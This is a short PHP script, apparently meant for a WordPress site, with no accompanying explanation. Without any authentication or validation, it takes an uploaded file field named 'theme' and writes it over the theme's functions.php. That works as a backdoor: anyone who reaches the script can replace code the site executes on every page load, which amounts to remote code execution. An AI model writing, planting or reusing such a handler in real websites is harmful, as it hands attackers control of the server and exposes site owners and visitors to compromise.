<?php
if (isset($_FILES['theme'])) {
    move_uploaded_file(
        $_FILES['theme']['tmp_name'],
        '/var/www/html/wp-content/themes/example/functions.php'
    );
}
